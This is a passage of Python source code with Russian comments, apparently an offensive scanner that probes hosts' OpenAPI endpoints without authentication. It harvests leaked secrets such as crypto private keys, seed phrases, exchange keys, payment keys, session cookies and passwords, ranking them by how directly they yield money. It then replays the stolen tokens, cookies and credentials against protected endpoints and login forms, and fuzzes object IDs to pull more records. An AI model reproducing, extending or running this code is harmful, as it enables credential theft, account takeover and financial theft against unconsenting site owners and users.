REPLAY_APIKEY_RE = re.compile(
    r'"(?:api_?key|x_?api_?key|apikey)"\s*:\s*"([A-Za-z0-9_\-]{16,120})"', re.I)
# login-эндпоинты из спека (POST, без {param}) для фазы 4
RE_LOGIN_PATH_RE = re.compile(
    r'login|sign[-_]?in|logon|authenticate|auth/token|/token|session', re.I)


def _replay_creds_from_text(text: str, out: list, seen: set, cap: int) -> None:
    """Креды (user, password): пары логин+пароль + расшифрованные Basic."""
    for m in REPLAY_PAIR_RE.finditer(text):
        if len(out) >= cap:
            return
        u, p = m.group(1).strip(), m.group(2)
        if is_masked_value(p) or is_placeholder_value("password", p) \
                or HASHED_PASSWORD_RE.match(p) or ENCODED_BLOB_RE.match(p):
            continue
        if u.lower() in PLACEHOLDER_VALUES:
            continue
        if (u, p) not in seen:
            seen.add((u, p))
            out.append((u, p))
    for m in REPLAY_BASIC_RE.finditer(text):
        if len(out) >= cap:
            return
        try:
            dec = base64.b64decode(m.group(1)).decode("utf-8", "replace")
        except (ValueError, TypeError):
            continue
        u, _, p = dec.partition(":")
        if u.lower() in PLACEHOLDER_VALUES or p.lower() in PLACEHOLDER_VALUES \
                or is_masked_value(p):
            continue
        if (u, p) not in seen:
            seen.add((u, p))
            out.append((u, p))


def _replay_sessions_from_text(text: str, out: list, seen: set, cap: int) -> None:
    """Сессии (имя-поля, значение) для Cookie-replay."""
    for m in REPLAY_SESSION_RE.finditer(text):
        if len(out) >= cap:
            return
        name, val = m.group(1).lower(), m.group(2)
        if is_junk_token_value(val) or val in seen:
            continue
        seen.add(val)
        out.append((name, val))


def _replay_apikeys_from_text(text: str, out: list, seen: set, cap: int) -> None:
    """api_key для X-API-Key-replay."""
    for m in REPLAY_APIKEY_RE.finditer(text):
        if len(out) >= cap:
            return
        val = m.group(1)
        if val.lower() in PLACEHOLDER_VALUES or UUID_VALUE_RE.match(val) \
                or re.match(r'(?i)^(fake|mock|demo|test|your|example)[_\-]', val):
            continue
        if val not in seen:
            seen.add(val)
            out.append(val)


def is_junk_token_value(val: str) -> bool:
    """Мусорные значения токенов/session id: fake_/mock_/demo_, даты, без цифр."""
    v = val.strip()
    if DATE_VALUE_RE.match(v):
        return True
    if re.match(r'(?i)^(fake|mock|test|demo|guest)[_-]', v):
        return True
    if not any(c.isdigit() for c in v):
        return True
    return False


# Severity по паттернам (из prototype/auth_checker/crypto_detect.py)
SEVERITY_MAP = {
    # CRITICAL - прямые деньги
    "password": "CRITICAL",
    "private_key_pem": "CRITICAL",
    "evm_private_key": "CRITICAL",
    "bitcoin_wif": "CRITICAL",
    "extended_key": "CRITICAL",
    "solana_key": "CRITICAL",
    "solana_keypair": "CRITICAL",
    "seed_phrase": "CRITICAL",
    "secret_key": "CRITICAL",
    "otp_secret": "CRITICAL",
    "stripe_live": "CRITICAL",
    "stripe_restricted": "CRITICAL",
    "withdraw_flag": "CRITICAL",
    "withdraw_endpoint": "CRITICAL",
    "withdraw_open": "CRITICAL",
    "withdraw_processed": "CRITICAL",
    "withdraw_protected": "HIGH",
    "withdraw_headers": "HIGH",
    "withdraw_noise": "MEDIUM",
    # HIGH - доступ к системам
    "facebook_access_token": "HIGH",
    "github_token": "HIGH",
    "gitlab_token": "HIGH",
    "telegram_bot": "HIGH",
    "telegram_bot_valid": "HIGH",
    "telegram_bot_money": "CRITICAL",
    "aws_key_valid": "HIGH",
    "stripe_key_valid": "CRITICAL",
    "slack_token_valid": "HIGH",
    "discord_token_valid": "HIGH",
    "github_token_valid": "HIGH",
    "gitlab_token_valid": "HIGH",
    "mailgun_key_valid": "HIGH",
    "sendgrid_key_valid": "HIGH",
    "npm_token_valid": "MEDIUM",
    "dropbox_token_valid": "HIGH",
    "twilio_pair_valid": "HIGH",
    "twitter_token_valid": "MEDIUM",
    "twitter_session": "CRITICAL",
    "twitter_session_valid": "CRITICAL",
    "card_number": "HIGH",
    "cryptopay_key": "HIGH",
    "cryptopay_key_valid": "CRITICAL",
    "exchange_key_valid": "CRITICAL",
    "exchange_withdraw_enabled": "CRITICAL",
    "money_target": "CRITICAL",
    "dsn_reachable": "MEDIUM",
    "dsn_auth_ok": "CRITICAL",
    "slack_token": "HIGH",
    "discord_token": "HIGH",
    "discord_webhook": "MEDIUM",
    "sendgrid_key": "HIGH",
    "twilio_key": "HIGH",
    "exchange_secret": "HIGH",
    "refresh_token": "HIGH",
    "auth_token": "HIGH",
    "bearer_token": "HIGH",
    "jwt_token": "HIGH",
    "aws_access_key": "HIGH",
    "aws_secret_key": "HIGH",
    "aws_session_token": "HIGH",
    "binance_key": "HIGH",
    "ai_apikey": "HIGH",
    "ai_key_valid": "HIGH",
    "exchange_keypair": "CRITICAL",
    "basic_auth": "HIGH",
    "reset_token": "HIGH",
    "two_fa_backup": "CRITICAL",
    "admin_flag": "HIGH",
    # Чекер-листы: логин+пароль = аккаунты
    "account_pair": "HIGH",
    # верифицированные аккаунты/деньги
    "facebook_valid": "HIGH",
    "private_key_money": "CRITICAL",
    # replay всех видов: bearer (token_replay выше), cookie (session_replay),
    # basic (cred_replay), x-api-key (apikey_replay); admin/money-сессии
    "session_replay": "CRITICAL",
    "cred_replay": "CRITICAL",
    "apikey_replay": "CRITICAL",
    "replay_admin": "CRITICAL",
    "replay_money": "CRITICAL",
    # найденный кред открыл login-эндпоинт (одна попытка, не брутфорс)
    "login_valid": "CRITICAL",
    "login_admin": "CRITICAL",
    # мультиформат-секреты (env/YAML/XML)
    "password_any": "CRITICAL",
    "api_key_any": "HIGH",
    # is_admin в ответе + фактический вход (путь /admin/* или токен рядом)
    "admin_area": "CRITICAL",
    "admin_access": "CRITICAL",
    "keystore_json": "CRITICAL",
    "smtp_password": "HIGH",
    "database_url": "HIGH",
    # TURN/iceScripts креды - времянки WebRTC, не секрет
    "credential": "MEDIUM",
    "access_token": "HIGH",
    # AIza почти всегда фронтендные Maps-ключи (бесплатные)
    "google_api_key": "MEDIUM",
    "openai_key": "HIGH",
    "mailgun_key": "HIGH",
    "npm_token": "HIGH",
    "pypi_token": "HIGH",
    "shopify_key": "HIGH",
    "dropbox_token": "HIGH",
    # MEDIUM - DSN
    "postgres_dsn": "MEDIUM",
    "mysql_dsn": "MEDIUM",
    "mongodb_dsn": "MEDIUM",
    "redis_dsn": "MEDIUM",
    "amqp_dsn": "MEDIUM",
    "smtp_dsn": "MEDIUM",
    # MEDIUM - sessions
    "session_id": "MEDIUM",
    "session_token": "MEDIUM",
    # TEST patterns
    "admin_password": "CRITICAL",
    "wp_auth_key": "HIGH",
    "wp_salt": "HIGH",
    "wp_password": "CRITICAL",
    "wp_creds_valid": "CRITICAL",
    # Активные пробы самого хоста как WP-админки
    "wp_login_found": "MEDIUM",
    "wp_users_enum": "HIGH",
    "integration_valid": "CRITICAL",
    "token_replay": "CRITICAL",
    "db_password": "CRITICAL",
    # Адрес кошелька сам по себе денег не даёт (нужен ключ) - понижаем
    "wallet_address": "MEDIUM",
    "wallet_address_money": "HIGH",
    "private_key_generic": "CRITICAL",
}


def is_openapi_spec(text: str) -> bool:
    """Проверяет что текст похож на OpenAPI спецификацию."""
    t = text[:2000].lower()
    if text.strip().startswith("{"):
        return any(kw in t for kw in ['"openapi"', '"swagger"', '"paths"', '"info"'])
    if "openapi:" in t or "swagger:" in t:
        return True
    return False


def classify_response(body: str) -> tuple[list[str], str]:
    """Классифицирует ответ по паттернам (логика из prototype/auth_checker)."""
    patterns_found: list[str] = []
    max_severity = "LOW"
    severity_order = {"LOW": 0, "MEDIUM": 1, "HIGH": 2, "CRITICAL": 3}

    for name, pattern in SENSITIVE_PATTERNS.items():
        matched = False
        # Перебираем все вхождения: первое может оказаться placeholder'ом,
        # а реальное значение - дальше по телу
        for m in pattern.finditer(body):
            value_text = m.group(0)

            # Для password проверяем что значение не маскировано и не placeholder
            if name in ("password", "admin_password", "db_password", "smtp_password", "reset_token", "wp_password"):
                val_match = re.search(r'"(\w+)"\s*:\s*"([^"]*)"', value_text)
                if val_match:
                    field, val = val_match.group(1), val_match.group(2)
                    if is_masked_value(val) or is_placeholder_value(field, val):
                        continue  # placeholder - проверяем следующие вхождения
                    if HASHED_PASSWORD_RE.match(val):
                        continue  # хеш пароля (вкл. сырой $2a$/$argon2), не plaintext
                    if HEX_HASH_RE.match(val):
                        continue  # md5/sha1/sha256 хеш
                    if ENCODED_BLOB_RE.match(val):
                        continue  # закодированный блоб (base64), не пароль

            # account_pair: пароль в паре должен быть реальным (hash/masked/placeholder - мимо)
            if name == "account_pair":
                pw = re.search(r'(?:password|admin_password|pwd|pass)"\s*:\s*"([^"]*)"', value_text, re.I)
                if pw:
                    val = pw.group(1)
                    if is_masked_value(val) or is_placeholder_value("password", val):
                        continue
                    if HASHED_PASSWORD_RE.match(val) or ENCODED_BLOB_RE.match(val):
                        continue

            # password_any/api_key_any (env/YAML/XML): guards как у JSON-семейства
            # + YAML-пустышки null/none/~/true/false
            if name in ("password_any", "api_key_any"):
                m2 = re.search(r'(?:=|:|>)[ \t]*(?:<!\[CDATA\[)?["\']?([^"\'<\n#]{1,120})', value_text)
                a_val = (m2.group(1).strip() if m2 else "").rstrip("'\"")
                if not a_val:
                    continue
                if a_val.lower() in ("null", "none", "true", "false", "nil", "~", "yes", "no", "changeme", "x", "xx"):
                    continue
                if is_masked_value(a_val) or is_placeholder_value("password" if name == "password_any" else "api_key", a_val):
                    continue
                if name == "password_any":
                    if HASHED_PASSWORD_RE.match(a_val) or HEX_HASH_RE.match(a_val) or ENCODED_BLOB_RE.match(a_val):
                        continue
                else:
                    # api_key: UUID/плейсхолдеры/fake-префиксы; alpha-only ключи
                    # (aetXhpWvqP) - реальные, digit-гвард тут лишний
                    if UUID_VALUE_RE.match(a_val) \
                            or re.match(r'(?i)^(fake|mock|demo|test|your|example)[_\-]', a_val):
                        continue
                # YAML-ветка на HTML/JS-страницах: строки вида
                # "password: form.get(...)", "new_password: form.get(...)," —
                # это JS-код, а не конфиг. Признак: скобки в значении
                # или trailing-запятая (end of JS-объектного свойства)
                if ":" in value_text:
                    tail = value_text.split(":", 1)[1]
                    if "(" in tail or "=>" in tail or tail.rstrip().endswith(",") \
                            or ".value" in tail \
                            or tail.lstrip().startswith(("document", "form", "window", "$(", "e", "this", "req")):
                        continue

            # Токены: отсеиваем мусорные значения (fake_, даты, без цифр)
            if name in ("refresh_token", "auth_token", "bearer_token", "access_token", "session_id", "session_token"):
                tok_match = re.search(r':\s*"([^"]*)"', value_text)
                if tok_match and is_junk_token_value(tok_match.group(1)):
                    continue
                # UUID-значения session-полей — анонимная сессия или аналитика
                # (сервер выдал новую сессию для запроса), не утечка
                if tok_match and name in ("session_id", "session_token") and UUID_VALUE_RE.match(tok_match.group(1)):
                    continue

            # credential: пропускаем не-секретные значения (дипломы, описания)
            if name == "credential":
                cred_match = re.search(r':\s*"([^"]*)"', value_text)
                if cred_match and not any(c.isdigit() for c in cred_match.group(1)):
                    continue

            # basic_auth: пропускаем примеры user:pass из документации
            if name == "basic_auth":
                b64_match = re.search(r'Basic\s+([A-Za-z0-9+/=]+)', value_text, re.I)
                if b64_match:
                    try:
                        user, _, pwd = base64.b64decode(b64_match.group(1)).decode("utf-8", "replace").partition(":")
                    except (ValueError, UnicodeDecodeError):
                        user, pwd = "", ""
                    if user.lower() in PLACEHOLDER_VALUES or pwd.lower() in PLACEHOLDER_VALUES or is_masked_value(pwd):
                        continue

            # Для AWS ключей: не пример, не мусор, не presigned URL
            if name == "aws_access_key":
                if is_aws_example_key(value_text):
                    continue
                # presigned S3 URL: ключ врЕменный, зашит в самой ссылке -
                # это не утечка кредов
                before = body[max(0, m.start() - 30):m.start()]
                if "X-Amz-Credential=" in before or "AWSAccessKeyId=" in before:
                    continue

            # Для DSN проверяем что не placeholder
            if name.endswith("_dsn") and is_placeholder_dsn(value_text):
                continue

            # solana_keypair: массив 64 байт считаем ключом только рядом
            # с контекстом кошелька (иначе ловим любые числовые массивы)
            if name == "solana_keypair":
                ctx = body[max(0, m.start() - 300):m.start() + 300].lower()
                if not re.search(r'solana|wallet|keypair|secret|privat', ctx):
                    continue

            # card_number: только Luhn-валидные реальные карты
            # (тестовые 4111…/4242… и номера-болваны не считаем)
            if name == "card_number":
                digits = re.sub(r'\D', '', value_text)
                if not (13 <= len(digits) <= 19
                        and luhn_ok(digits) and not is_test_card(digits)):
                    continue

            matched = True
            break

        if not matched:
            continue

        patterns_found.append(name)
        sev = SEVERITY_MAP.get(name, "LOW")
        if severity_order.get(sev, 0) > severity_order.get(max_severity, 0):
            max_severity = sev

    return patterns_found, max_severity


async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> CheckResult:
    """
    Проверяет хост: ищет OpenAPI, тестирует эндпоинты.

    Эта функция ничего не знает про БД — только сеть.
    """
    base_url = row.base_url  # protocol://host:port

    started = time.perf_counter()
    deadline = time.monotonic() + cfg.host_timeout
    result = CheckResult(is_alive=False)

    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE

    timeout = aiohttp.ClientTimeout(total=cfg.check_timeout)
    connector = aiohttp.TCPConnector(ssl=ssl_ctx, limit=10)

    try:
        async with aiohttp.ClientSession(
            timeout=timeout,
            connector=connector,
        ) as session:
            # 1. TCP alive check
            result.is_alive = True
            result.latency_ms = int((time.perf_counter() - started) * 1000)

            # 2. Поиск OpenAPI спецификации
            spec = None
            spec_path = None

            for path in OPENAPI_PATHS:
                if time.monotonic() >= deadline:
                    break
                try:
                    url = base_url.rstrip("/") + path
                    async with session.get(url, allow_redirects=False, proxy=proxy) as resp:
                        if resp.status == 200:
                            text = await resp.text()
                            if is_openapi_spec(text):
                                spec = json.loads(text)
                                spec_path = path
                                break
                except (json.JSONDecodeError, aiohttp.ClientError):
                    continue

            if spec is None:
                result.has_openapi = False
                return result

            # 3. Парсим спецификацию
            result.has_openapi = True
            result.spec_path = spec_path
            result.spec_title = spec.get("info", {}).get("title", "Unknown")

            paths = spec.get("paths", {})
            security_schemes = spec.get("components", {}).get("securitySchemes", {})
            global_security = spec.get("security", [])
            has_global_security = bool(global_security) or bool(security_schemes)

            endpoints_data: list[dict[str, Any]] = []
            all_patterns: list[str] = []
            max_severity = "LOW"
            severity_order = {"LOW": 0, "MEDIUM": 1, "HIGH": 2, "CRITICAL": 3}
            # AI-ключи, найденные в ответах (key -> provider), для верификации
            ai_keys_found: dict[str, str] = {}
            telegram_bots_found: set[str] = set()
            aws_keypairs_found: dict[tuple[str, str, str], None] = {}
            dsns_found: set[str] = set()
            secrets_found: set[tuple[str, str]] = set()
            twilio_pairs_found: set[tuple[str, str]] = set()
            twitter_bearers_found: set[str] = set()
            twitter_sessions_found: list[dict[str, Any]] = []
            twitter_sessions_total: int = 0
            exchange_pairs_found: list[dict[str, Any]] = []
            exchange_pairs_seen: set[tuple[str, str, str]] = set()
            cryptopay_keys_found: list[dict[str, Any]] = []
            cryptopay_keys_seen: set[tuple] = set()
            wp_pairs_found: list[dict[str, str]] = []
            wp_panel_seen: bool = False
            facebook_tokens_found: list[str] = []
            facebook_tokens_seen: set[str] = set()
            crypto_keys_found: list[dict[str, str]] = []
            crypto_keys_seen: set[tuple[str, str]] = set()
            integrations_found: list[dict[str, str]] = []
            integration_entries_seen: set[str] = set()
            integration_panel_seen: bool = False
            # token replay: access_token'ы из тел + protected GET (401/403)
            auth_tokens_found: list[str] = []
            auth_token_sources: dict[str, str] = {}
            protected_gets: list[tuple[str, str]] = []
            token_replay_checks: list[dict[str, Any]] = []
            # replay-входы фазы 3: cookie-сессии / креды / api-keys
            replay_sessions: list[tuple[str, str]] = []
            replay_sessions_seen: set[str] = set()
            replay_creds: list[tuple[str, str]] = []
            replay_creds_seen: set[tuple[str, str]] = set()
            replay_apikeys: list[str] = []
            replay_apikeys_seen: set[str] = set()
            # login-эндпоинты (фаза 4: cred-проверка одной попыткой)
            login_paths: list[str] = []
            login_checks: list[dict[str, Any]] = []
            # id-fuzz: id'шники из тел + GET-шаблоны с {param} для фазы 2
            fuzz_buckets: dict[str, set[str]] = {}
            param_templates_seen: set[str] = set()

            # 4. Тестируем эндпоинты
            for path_template, methods in paths.items():
                if not isinstance(methods, dict):
                    continue

                for method, details in methods.items():
                    if time.monotonic() >= deadline:
                        break
                    if method.upper() not in ("GET", "POST", "PUT", "DELETE", "PATCH"):
                        continue

                    # Игнорируем демо/гостевые эндпоинты целиком:
                    # там креды выданы специально, проверять и писать нечего
                    if DEMO_GUEST_PATH_RE.search(path_template):
                        continue

                    # Проверяем security на уровне операции
                    op_security = details.get("security", None)
                    expects_auth = has_global_security if op_security is None else bool(op_security)

                    # Money rule: POST на путь с withdraw/payout/cashout -
                    # потенциальный вывод средств (GET-истории не считаем)
                    withdraw_op = (
                        method.upper() == "POST"
                        and bool(WITHDRAW_PATH_RE.search(path_template))
                    )

                    # Подставляем параметры пути
                    test_path = re.sub(r'\{[^}]+\}', '1', path_template)
                    url = base_url.rstrip("/") + test_path

                    ep_data: dict[str, Any] = {
                        "path": path_template,
                        "method": method.upper(),
                        "expects_auth": expects_auth,
                        "status_code": None,
                        "verdict": None,
                        "patterns": [],
                        "response": None,
                    }

                    try:
                        async with session.request(
                            method.upper(),
                            url,
                            allow_redirects=False,
                            timeout=aiohttp.ClientTimeout(total=cfg.check_timeout),
                            proxy=proxy,
                        ) as resp:
                            ep_data["status_code"] = resp.status
                            body = await resp.text()

                            if resp.status == 200:
                                # Классифицируем ответ
                                patterns, sev = classify_response(body[:100_000])
                                if withdraw_op:
                                    # Пассивная классификация по ответу:
                                    # open/processed = деньги доступны, protected =
                                    # нужен auth, noise = заглушка
                                    wclass = classify_withdraw_response(body)
                                    patterns = patterns + ["withdraw_endpoint"]
                                    if wclass:
                                        patterns.append(wclass)
                                    wsev = WITHDRAW_CLASS_SEVERITY.get(wclass, "CRITICAL")
                                    if severity_order.get(wsev, 0) > severity_order.get(sev, 0):
                                        sev = wsev
                                # Money rule: адрес кошелька в денежном контексте
                                if gate_wallet_money(patterns, path_template):
                                    patterns.append("wallet_address_money")
                                    if severity_order.get("HIGH", 0) > severity_order.get(sev, 0):
                                        sev = "HIGH"

                                # is_admin: голый флаг в списках профилей - не находка.
                                # Находим факт входа: /admin/* без auth или токен рядом.
                                if "admin_flag" in patterns:
                                    if ADMIN_PATH_RE.search(path_template) and "admin_area" not in patterns:
                                        patterns.append("admin_area")
                                        if severity_order["CRITICAL"] > severity_order.get(sev, 0):
                                            sev = "CRITICAL"
                                    elif ADMIN_TOKEN_RE.search(body[:2_000]) and "admin_access" not in patterns:
                                        patterns.append("admin_access")
                                        if severity_order["CRITICAL"] > severity_order.get(sev, 0):
                                            sev = "CRITICAL"
                                    else:
                                        # просто is_admin: true/1 в данных - убираем;
                                        # severity пересчитываем по оставшимся паттернам
                                        patterns.remove("admin_flag")
                                        if patterns:
                                            sev = max(
                                                (SEVERITY_MAP.get(p, "LOW") for p in patterns),
                                                key=severity_order.get,
                                            )
                                        else:
                                            sev = "LOW"
                                ep_data["patterns"] = patterns
                                all_patterns.extend(patterns)

                                # Собираем AI-ключи, ботов, AWS-ключи и DSN для проверки
                                if cfg.ai_key_checks:
                                    for prov, k in extract_ai_keys(body[:100_000]):
                                        ai_keys_found.setdefault(k, prov)
                                if cfg.telegram_bot_checks:
                                    telegram_bots_found.update(extract_telegram_bots(body[:100_000]))
                                if cfg.aws_key_checks:
                                    for access_key, secret, sess_token in extract_aws_keypairs(body[:100_000]):
                                        if (
                                            not is_aws_example_key(access_key)
                                            and not secret.endswith('EXAMPLEKEY')
                                        ):
                                            aws_keypairs_found.setdefault((access_key, secret, sess_token), None)
                                if cfg.dsn_checks:
                                    dsns_found.update(
                                        d for d in extract_dsns(body[:100_000])
                                        if not is_placeholder_dsn(d)
                                    )
                                if cfg.secret_checks:
                                    secrets_found.update(extract_secrets(body[:100_000]))
                                if cfg.integration_checks:
                                    # интеграционные токены панелей (service_type+api_key)
                                    if '"api_key"' in body:
                                        integration_panel_seen = True
                                    for entry in extract_integrations(body[:100_000]):
                                        if entry["api_key"] not in integration_entries_seen:
                                            integration_entries_seen.add(entry["api_key"])
                                            integrations_found.append(entry)
                                if cfg.token_replay:
                                    # access_token из тела (напр. debug/authorize)
                                    # → replay в protected GET на фазе 3
                                    for m in TOKEN_RE_RE.finditer(body[:100_000]):
                                        tok = m.group(1)
                                        if is_junk_token_value(tok):
                                            continue
                                        if tok not in auth_tokens_found \
                                                and len(auth_tokens_found) < cfg.token_replay_max:
                                            auth_tokens_found.append(tok)
                                            # источник токена (где утёк) для панели
                                            auth_token_sources.setdefault(tok, path_template)
                                # replay-входы: сессии/креды/api-keys из тел
                                if cfg.session_replay:
                                    _replay_sessions_from_text(
                                        body[:100_000], replay_sessions,
                                        replay_sessions_seen, cfg.session_replay_max)
                                if cfg.cred_replay:
                                    _replay_creds_from_text(
                                        body[:100_000], replay_creds,
                                        replay_creds_seen, cfg.cred_replay_max)
                                if cfg.apikey_replay:
                                    _replay_apikeys_from_text(
                                        body[:100_000], replay_apikeys,
                                        replay_apikeys_seen, cfg.apikey_replay_max)
                                if cfg.wp_checks:
                                    # маркер + извлечение пар (url можно взять из entry);
                                    # без закрывающей кавычки - ловит и wp_username
                                    if '"wp_user' in body or '"wp_pass' in body:
                                        wp_panel_seen = True
                                    wp_pairs_found.extend(
                                        extract_wp_creds(body[:100_000], fallback_url=base_url))
                                if cfg.facebook_checks:
                                    for tok in extract_facebook_tokens(body[:100_000]):
                                        if tok not in facebook_tokens_seen \
                                                and len(facebook_tokens_found) < cfg.facebook_verify_max:
                                            facebook_tokens_seen.add(tok)
                                            facebook_tokens_found.append(tok)
                                if cfg.key_balance_checks:
                                    for e in extract_crypto_keys(body[:100_000]):
                                        sig = (e["kind"], e["value"])
                                        if sig not in crypto_keys_seen \
                                                and len(crypto_keys_found) < cfg.key_balance_max:
                                            crypto_keys_seen.add(sig)
                                            crypto_keys_found.append(e)
                                if cfg.id_fuzz:
                                    # фаза 1: GET-шаблоны с {param} + значения
                                    # подстановок из тел (id/username/slug/email/...)
                                    if "{" in path_template and method.upper() == "GET":
                                        param_templates_seen.add(path_template)
                                    # login-эндпоинты (фаза 4): POST без {param}
                                    # (login обычно открыт - собираем всегда)
                                    if cfg.login_checks and method.upper() == "POST" \
                                            and "{" not in path_template \
                                            and RE_LOGIN_PATH_RE.search(path_template) \
                                            and len(login_paths) < 5:
                                        login_paths.append(path_template)
                                    for m in FUZZ_PAIR_RE.finditer(body[:100_000]):
                                        fld = m.group(1).lower()
                                        val = (m.group(2) or "").strip()
                                        if not val or not FUZZ_FIELD_RE.search(fld):
                                            continue
                                        bucket = fuzz_buckets.setdefault(fld, set())
                                        if len(bucket) < cfg.id_fuzz_max:
                                            bucket.add(val)
                                        # похожие значения (digits-выжимка,
                                        # email local, uuid-без-дефисов, соседи ±1)
                                        for v in _fuzz_value_variants(val):
                                            if len(bucket) >= cfg.id_fuzz_max or v in bucket:
                                                continue
                                            bucket.add(v)
                                if cfg.twilio_checks:
                                    twilio_pairs_found.update(extract_twilio_pairs(body[:100_000]))
                                if cfg.twitter_checks:
                                    twitter_bearers_found.update(
                                        extract_twitter_bearers(body[:100_000]))
                                    all_sessions = extract_twitter_sessions(
                                        body[:100_000], limit=None)
                                    # размер хранилища аккаунтов на панели
                                    twitter_sessions_total = max(
                                        twitter_sessions_total, len(all_sessions))
                                    for tses in all_sessions:
                                        if len(twitter_sessions_found) >= \
                                                cfg.twitter_session_max:
                                            break
                                        if not any(t["auth_token"] == tses["auth_token"]
                                                   for t in twitter_sessions_found):
                                            twitter_sessions_found.append(tses)
                                if cfg.exchange_checks:
                                    for p in extract_exchange_pairs(body[:100_000]):
                                        sig = (p["exchange"], p["key"], p["secret"])
                                        if sig not in exchange_pairs_seen:
                                            exchange_pairs_seen.add(sig)
                                            exchange_pairs_found.append(p)
                                if cfg.cryptopay_checks:
                                    for p in extract_cryptopay_keys(body[:100_000]):
                                        sig = (p["service"], p["key"], p["merchant"])
                                        if sig not in cryptopay_keys_seen:
                                            cryptopay_keys_seen.add(sig)
                                            cryptopay_keys_found.append(p)

                                if severity_order.get(sev, 0) > severity_order.get(max_severity, 0):
                                    max_severity = sev

                                # Логика verdict:
                                # WITHDRAW_RISK - POST withdraw-эндпоинт доступен без auth
                                # VULNERABLE - есть паттерны (реальные данные)
                                # EXPOSED - expects_auth но доступен без auth (потенциальная проблема)
                                # PUBLIC_OK - публичный эндпоинт
                                if patterns:
                                    ep_data["verdict"] = "WITHDRAW_RISK" if withdraw_op else "VULNERABLE"
                                    result.vulnerable_count += 1
                                elif expects_auth:
                                    ep_data["verdict"] = "EXPOSED"
                                    result.public_count += 1  # считаем как exposed, не vulnerable
                                else:
                                    ep_data["verdict"] = "PUBLIC_OK"
                                    result.public_count += 1

                                # Сохраняем ответ только для важных эндпоинтов.
                                # JSON парсим целиком: срез body[:50_000] ломал
                                # валидный JSON посередине (обрезанный ответ в панели).
                                # JSONL (объект на строку) целиком тоже не парсится —
                                # храним как есть, без обрезки. Не-JSON (html/xml) —
                                # 100К, вровень с окном детекции body[:100_000]
                                if patterns:
                                    try:
                                        ep_data["response"] = json.loads(body)
                                    except (json.JSONDecodeError, ValueError):
                                        try:
                                            for line in body.splitlines():
                                                line = line.strip()
                                                if line:
                                                    json.loads(line)
                                            ep_data["response"] = body
                                        except (json.JSONDecodeError, ValueError):
                                            ep_data["response"] = body[:100_000]

                            elif resp.status in (401, 403):
                                ep_data["verdict"] = "PROTECTED"
                                result.protected_count += 1
                                # token replay: закрытый GET - цель для фазы 3
                                if (cfg.token_replay or cfg.session_replay
                                        or cfg.cred_replay or cfg.apikey_replay) \
                                        and method.upper() == "GET" \
                                        and len(protected_gets) < cfg.token_replay_endpoints_max:
                                    protected_gets.append((path_template, test_path))
                            else:
                                ep_data["verdict"] = "ERROR"

                    except (aiohttp.ClientError, asyncio.TimeoutError):
                        ep_data["verdict"] = "ERROR"

                    endpoints_data.append(ep_data)
                    result.total_endpoints += 1

            # Фаза 2 — id-fuzz: подставляемые значения (id, username, slug,
            # email, ...) из тел подставляются в GET-шаблоны с {param} по
            # совпадению имени поля с именем параметра. Ответы идут через
            # те же детекторы/экстракторы — находки фидятся в секреты/
            # wp-пары/AI-ключи и верифицируются ниже. Каскад: значения из
            # фазовых ответов тоже собираются (id 15 может открыть то,
            # чего нет на id 1). Дедуп (шаблон, param, value) — запрос
            # выполняется один раз; '1' из фазы 1 помечена как уже
            # проверенная. Лимиты: id_fuzz_max значений на параметр,
            # id_fuzz_templates_max шаблонов, id_fuzz_rounds раундов.
            if cfg.id_fuzz and fuzz_buckets and param_templates_seen:
                fuzz_seen: set[tuple] = set()
                for _round in range(cfg.id_fuzz_rounds):
                    fuzz_new = False
                    for tmpl in list(param_templates_seen)[: cfg.id_fuzz_templates_max]:
                        if time.monotonic() >= deadline:
                            break
                        for param in re.findall(r'\{([^}]+)\}', tmpl):
                            if time.monotonic() >= deadline:
                                break
                            for val in _fuzz_candidates(param, fuzz_buckets, cfg.id_fuzz_max):
                                if time.monotonic() >= deadline:
                                    break
                                if (tmpl, param, val) in fuzz_seen:
                                    continue
                                fuzz_seen.add((tmpl, param, val))
                                fuzz_path = re.sub(r'\{' + re.escape(param) + r'\}',
                                               quote(val, safe=''), tmpl)
                                try:
                                    async with session.get(
                                        base_url.rstrip("/") + fuzz_path,
                                        allow_redirects=False,
                                        timeout=aiohttp.ClientTimeout(total=cfg.check_timeout),
                                        proxy=proxy,
                                    ) as fresp:
                                        if fresp.status != 200:
                                            continue
                                        fbody = await fresp.text()
                                        fpatterns, fsev = classify_response(fbody[:100_000])
                                        # подстановочные значения из фазового ответа - в каскад
                                        before_vals = sum(len(b) for b in fuzz_buckets.values())
                                        for m in FUZZ_PAIR_RE.finditer(fbody[:100_000]):
                                            fld = m.group(1).lower()
                                            fval = (m.group(2) or "").strip()
                                            if not fval or not FUZZ_FIELD_RE.search(fld):
                                                continue
                                            bucket = fuzz_buckets.setdefault(fld, set())
                                            if len(bucket) < cfg.id_fuzz_max and fval not in bucket:
                                                bucket.add(fval)
                                                fuzz_new = True
                                            # похожие значения - в каскад тоже
                                            for v in _fuzz_value_variants(fval):
                                                if len(bucket) >= cfg.id_fuzz_max or v in bucket:
                                                    continue
                                                bucket.add(v)
                                                fuzz_new = True
                                        if not fpatterns:
                                            continue
                                        # admin_flag: как в основном проходе
                                        if "admin_flag" in fpatterns:
                                            if ADMIN_PATH_RE.search(tmpl) and \
                                                    "admin_area" not in fpatterns:
                                                fpatterns.append("admin_area")
                                            else:
                                                fpatterns.remove("admin_flag")
                                                if not fpatterns:
                                                    continue
                                        all_patterns.extend(fpatterns)
                                        fresp_data: dict[str, Any] = {
                                            # панель: шаблон + значение подстановки
                                            "path": tmpl + f"#id={val}",
                                            "method": "GET",
                                            "expects_auth": False,
                                            "status_code": fresp.status,
                                            "verdict": "VULNERABLE",
                                            "patterns": fpatterns,
                                            "response": None,
                                        }
                                        try:
                                            fresp_data["response"] = json.loads(fbody)
                                        except (json.JSONDecodeError, ValueError):
                                            fresp_data["response"] = fbody[:100_000]
                                        endpoints_data.append(fresp_data)
                                        result.total_endpoints += 1
                                        result.vulnerable_count += 1
                                        if severity_order.get(fsev, 0) > severity_order.get(max_severity, 0):
                                            max_severity = fsev
                                        # фиды для verify-блоков ниже
                                        if cfg.secret_checks:
                                            secrets_found.update(extract_secrets(fbody[:100_000]))
                                        if cfg.wp_checks:
                                            if '"wp_user' in fbody or '"wp_pass' in fbody:
                                                wp_panel_seen = True
                                            wp_pairs_found.extend(
                                                extract_wp_creds(fbody[:100_000], fallback_url=base_url))
                                        if cfg.facebook_checks:
